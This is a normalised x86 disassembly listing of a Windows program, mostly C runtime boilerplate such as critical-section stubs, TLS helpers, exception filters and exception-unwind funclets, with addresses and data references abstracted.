mov eax [ ebp - 0x14 ]
call sub_42766d
retn
sub_427b0e
xor eax eax
inc eax
retn
sub_427b12
mov esp [ ebp - 0x18 ]
call sub_42eecd
sub_427ba7
xor eax eax
inc eax
retn
sub_427bab
mov esp [ ebp - 0x18 ]
call sub_42eecd
sub_42805d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_423871
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42856a
call sub_42a735
mov ecx eax
mov eax [ ecx + 0x6c ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ eax + 0xc8 ]
retn
mov edx [ rw-data ]
test [ ecx + 0x70 ] edx
jne r-xdata
call sub_4266f5
sub_428a36
mov eax sub_43456f
mov [ rw-data ] eax
mov [ rw-data ] sub_433c56
mov [ rw-data ] sub_433c0a
mov [ rw-data ] sub_433c43
mov [ rw-data ] sub_433bac
mov [ rw-data ] eax
mov [ rw-data ] sub_4344e7
mov [ rw-data ] sub_433bc8
mov [ rw-data ] sub_433b2a
mov [ rw-data ] sub_433ab7
retn
sub_428a96
mov edi edi
push ebp
mov ebp esp
call sub_428a36
call sub_43461c
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_4345b3
sub_42a00f
push 0xd
call sub_42e1de
pop ecx
retn
sub_42a3da
push 0xd
call sub_42e1de
pop ecx
retn
sub_42a413
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_42a279
pop ecx
mov [ rw-data ] 0x1
sub_42a51e
call [ TlsAlloc@IAT ]
retn 0x4
sub_42a527
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_42a541
mov eax [ rw-data ]
retn
sub_42a57b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_42a4ac
pop ecx
call eax
pop ebp
retn 0x8
sub_42a6aa
push 0xd
call sub_42e1de
pop ecx
retn
sub_42a6b3
push 0xc
call sub_42e1de
pop ecx
retn
sub_42a869
push 0xd
call sub_42e1de
pop ecx
retn
sub_42a875
push 0xc
call sub_42e1de
pop ecx
retn
sub_42aecb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_42af81
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42af56
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_42af99
push 0x8
call sub_42e2b8
pop ecx
retn
sub_42afa2
push 0x8
call sub_42e1de
pop ecx
retn
sub_42b188
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_42e1de
pop ecx
sub_42b19d
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_42b071
add esp 0xc
pop ebp
retn
sub_42b1b3
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_42b071
add esp 0xc
pop ebp
retn
sub_42b1c9
push 0x1
push 0x0
push 0x0
call sub_42b071
add esp 0xc
retn
sub_42b1d8
push 0x1
push 0x1
push 0x0
call sub_42b071
add esp 0xc
retn
sub_42b235
retn
sub_42b3dd
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_42b58c
and [ rw-data ] 0x0
retn
sub_42b61a
mov eax rw-data
retn
sub_42b6d1
call sub_42d24a
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_424869
pop ecx
retn
call sub_43589c
sub_42bbc7
push 0x1
call sub_42e1de
pop ecx
retn
sub_42bca6
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_42bbd0
add esp 0xc
pop ebp
retn 0x4
sub_42bcd9
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_436625
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_42bd0c
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_42bbd0
add esp 0xc
pop ebp
retn 0x8
sub_42c503
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_42c8a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42d0b6
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_42d212
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_42b7a0
pop ecx
pop ecx
retn
sub_42d241
push 0x1
call sub_42e1de
pop ecx
retn
sub_42d24a
push 0x1
call sub_42d170
pop ecx
retn
sub_42d39a
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_42ddff
push 0xe
call sub_42e1de
pop ecx
retn
sub_42dff7
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_42e032
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_42e103
push 0x4
call sub_42e1de
pop ecx
retn
sub_42e1de
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_42e2af
push 0xa
call sub_42e1de
pop ecx
retn
sub_42eeab
push 0x4
call sub_42e1de
pop ecx
retn
sub_42eecd
push 0x8
push r--data
call sub_42b398
call sub_42a735
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4262e8
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_42eeed
xor eax eax
inc eax
retn
sub_42ef06
call sub_42a735
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_42eecd
call eax
sub_42ef3d
xor eax eax
inc eax
retn
sub_42ef51
push sub_42eecd
call sub_42a431
pop ecx
mov [ rw-data ] eax
retn
sub_42f508
mov eax rw-data
retn
sub_42f50e
mov eax rw-data
retn
sub_42f514
mov eax rw-data
retn
sub_42f51a
mov eax rw-data
retn
sub_42f520
mov edi edi
push ebp
mov ebp esp
call sub_42f508
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_42f531
mov edi edi
push ebp
mov ebp esp
call sub_42f50e
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_42f542
mov edi edi
push ebp
mov ebp esp
call sub_42f514
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn
sub_42f7ff
push 0x7
call sub_42e1de
pop ecx
retn
sub_42fcae
push 0x6
call sub_42e1de
pop ecx
retn
sub_42fcef
push 0x6
call sub_42e1de
pop ecx
retn
sub_42ffcc
push 0xc
push r--data
call sub_42b398
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
sub_42ffe9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_43007e
call sub_43001c
mov [ rw-data ] eax
xor eax eax
retn
sub_4300cd
push sub_43008b
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_430782
xor eax eax
inc eax
retn
sub_430ac8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_430b1d
push [ rw-data ]
call sub_42a4ac
pop ecx
retn
sub_430c9e
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_42e1de
pop ecx
sub_433800
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_433a26
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_436f80
sub_433c0a
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433bc8
add esp 0x10
pop ebp
retn
sub_433c43
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_433ab7
pop ecx
pop ecx
pop ebp
retn
sub_433c56
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_433b2a
pop ecx
pop ecx
pop ebp
retn
sub_43467d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_434645
pop ecx
pop ecx
pop ebp
retn
sub_4348b9
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_434970
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_435738
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_435747
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_435777
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_43578e
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
push 0x8
call [ SetLastError@IAT ]
sub_435932
push 0x1
call sub_42e1de
pop ecx
retn
sub_436372
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436147
add esp 0x10
pop ebp
retn
sub_4364f6
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43638c
add esp 0x10
pop ebp
retn
sub_4365f9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_436530
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_436644
call eax
retn
sub_43685c
push 0xa
call sub_42e1de
pop ecx
retn
sub_43695f
push 0xa
call sub_42e1de
pop ecx
retn
sub_436a1d
push 0xb
call sub_42e1de
pop ecx
retn
sub_436f66
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_436e4f
add esp 0x10
pop ebp
retn
sub_437082
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_437dbc
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_437d69
add esp 0x10
pop ebp
retn
sub_4383cf
push 0x2
call sub_42af2d
pop ecx
retn
sub_438779
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_4388b3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4387c5
add esp 0x10
pop ebp
retn
sub_439ef1
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_43a047
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_439f8b
add esp 0xc
pop ebp
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_43a297
push [ ebp + 0x8 ]
call sub_436865
pop ecx
retn
sub_43a540
cmp [ rw-data ] 0x0
je sub_43a576
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_43a5eb
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43a5f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a60e
lea ecx [ ebp - 0x10 ]
jmp sub_423066
sub_43a616
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a631
mov ecx [ ebp - 0x10 ]
jmp sub_4061b0
sub_43a639
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a654
mov ecx [ ebp - 0x10 ]
jmp sub_4061b0
sub_43a65c
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_410038
sub_43a667
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a682
lea ecx [ ebp - 0x10 ]
jmp sub_423066
sub_43a68a
push [ ebp - 0x14 ]
call sub_42412e
pop ecx
retn
sub_43a694
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a6af
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a6ca
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a6e5
mov esi [ ebp - 0x10 ]
add esi 0x8
jmp sub_4011ad
sub_43a6f0
mov esi [ ebp - 0x10 ]
add esi 0xb4
jmp sub_40f06d
sub_43a6fe
mov ecx [ ebp - 0x10 ]
add ecx 0xd0
jmp sub_410038
sub_43a70c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a727
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_423097
sub_43a732
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a74d
mov ecx [ ebp + 0x8 ]
jmp sub_423066
sub_43a755
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_410038
sub_43a760
mov ecx [ ebp + 0x8 ]
add ecx 0x20
jmp sub_410038
sub_43a76b
mov ecx [ ebp + 0x8 ]
add ecx 0x3c
jmp sub_410038
sub_43a776
mov ecx [ ebp + 0x8 ]
add ecx 0x58
jmp sub_410038
sub_43a781
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a79c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a7b7
mov ecx [ ebp - 0x10 ]
jmp sub_4238ce
sub_43a7bf
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a7da
lea ecx [ ebp + 0xc ]
jmp sub_410038
sub_43a7e2
mov eax [ ebp - 0x10 ]
add eax 0x8
jmp sub_403f2c
sub_43a7ed
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_410038
sub_43a7f8
mov ecx [ ebp - 0x10 ]
add ecx 0x40
jmp sub_410038
sub_43a803
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a81e
lea ecx [ ebp + 0xc ]
jmp sub_410038
sub_43a826
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a841
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43a84f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a86a
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43a878
mov ecx [ ebp + 0xc ]
jmp sub_410038
sub_43a880
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a89b
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43a8a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a8c4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a8df
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43a8ed
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a908
mov ecx [ ebp + 0x8 ]
jmp sub_408b8a
sub_43a910
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a92b
mov ecx [ ebp - 0x10 ]
sub ecx 0x48
jmp sub_408a2f
sub_43a936
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a951
mov eax [ ebp - 0x24 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x24 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_410038
sub_43a96a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a985
mov eax [ ebp - 0x20 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x20 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_410038
sub_43a99e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a9b9
mov ecx [ ebp + 0x8 ]
jmp sub_410038
sub_43a9c1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43a9dc
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43a9ea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43aa05
mov ecx [ ebp + 0x8 ]
jmp sub_410038
sub_43aa0d
mov ecx [ ebp + 0x8 ]
add ecx 0x1c
jmp sub_410038
sub_43aa18
mov ecx [ ebp + 0x8 ]
add ecx 0x38
jmp sub_410038
sub_43aa23
mov ecx [ ebp + 0x8 ]
add ecx 0x54
jmp sub_410038
sub_43aa2e
mov ecx [ ebp + 0x8 ]
add ecx 0x70
jmp sub_410038
sub_43aa39
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43aa54
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40ac0f
pop ecx
pop ecx
retn
sub_43aa62
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43aa7d
lea ecx [ ebp - 0x64 ]
jmp sub_410038
sub_43aa85
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43aa8d
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43aa95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_4234de
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43aaba
mov ecx [ ebp + 0x8 ]
jmp sub_410620
sub_43aac2
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_410038
sub_43aacd
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43aae6
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43aaee
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43aaf6
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43aafe
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43ab06
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ab21
mov ecx [ ebp - 0x10 ]
jmp sub_4203ea
sub_43ab29
mov ecx [ ebp - 0x10 ]
add ecx 0x164
jmp sub_410038
sub_43ab37
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ab52
mov ecx [ ebp - 0x10 ]
jmp sub_4203ea
sub_43ab5a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ab75
lea ecx [ ebp + 0xc ]
jmp sub_410038
sub_43ab7d
mov ecx [ ebp - 0x14 ]
jmp sub_4203ea
sub_43ab85
push [ ebp - 0x10 ]
call sub_42412e
pop ecx
retn
sub_43ab8f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43abaa
lea ecx [ ebp + 0xc ]
jmp sub_410038
sub_43abb2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43abcd
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
jmp sub_410038
sub_43abe6
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43abee
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43abf6
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43abfe
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43ac06
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43ac0e
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43ac16
lea ecx [ ebp - 0x48 ]
jmp sub_410038
sub_43ac1e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ac39
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43ac52
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ac6d
lea ecx [ ebp - 0x40 ]
jmp sub_410038
sub_43ac75
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ac90
lea ecx [ ebp - 0x3c ]
jmp sub_410038
sub_43ac98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43acb3
push [ ebp - 0x3c ]
call sub_42412e
pop ecx
retn
sub_43acbd
mov eax [ ebp - 0x40 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x40 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43acd6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x44 ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43acf1
lea ecx [ ebp - 0x2c ]
jmp sub_410038
sub_43acf9
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ad14
lea ecx [ ebp - 0x50 ]
jmp sub_410038
sub_43ad1c
lea ecx [ ebp - 0x34 ]
jmp sub_410038
sub_43ad24
lea esi [ ebp - 0x88 ]
jmp sub_4049b2
sub_43ad2f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ad4d
mov eax [ ebp - 0x10 ]
add eax 0x14
jmp sub_418e9c
sub_43ad58
mov ecx [ ebp - 0x10 ]
add ecx 0x30
jmp sub_410038
sub_43ad63
mov ecx [ ebp - 0x10 ]
add ecx 0x4c
jmp sub_410038
sub_43ad6e
mov ecx [ ebp - 0x10 ]
add ecx 0x68
jmp sub_410038
sub_43ad79
mov ecx [ ebp - 0x10 ]
add ecx 0x84
jmp sub_410038
sub_43ad87
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ada2
mov ecx [ ebp + 0x8 ]
jmp sub_410620
sub_43adaa
mov ecx [ ebp + 0x8 ]
add ecx 0x8
jmp sub_410038
sub_43adb5
mov ecx [ ebp + 0x8 ]
add ecx 0x24
jmp sub_410038
sub_43adc0
mov ecx [ ebp + 0x8 ]
add ecx 0x40
jmp sub_410038
sub_43adcb
mov eax [ ebp - 0x14 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffe
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43ade4
mov eax [ ebp - 0x14 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x14 ] 0xfffffffd
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43adfd
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43ae05
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43ae0d
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43ae15
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43ae1d
lea ecx [ ebp - 0x30 ]
jmp sub_410038
sub_43ae25
lea ecx [ ebp - 0x4c ]
jmp sub_410038
sub_43ae2d
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43ae35
lea ecx [ ebp - 0x68 ]
jmp sub_410038
sub_43ae3d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_4234de
mov eax r--data
jmp sub_425a54
sub_43ae58
lea ecx [ ebp - 0x28 ]
jmp sub_410038
sub_43ae60
lea ecx [ ebp - 0x44 ]
jmp sub_410038
sub_43ae68
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43ae70
lea ecx [ ebp ]
jmp sub_410038
sub_43ae78
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43ae80
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43ae88
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43ae90
lea ecx [ ebp + 0x1c ]
jmp sub_410038
sub_43ae98
lea ecx [ ebp ]
jmp sub_410038
sub_43aea0
lea ecx [ ebp + 0x38 ]
jmp sub_410038
sub_43aea8
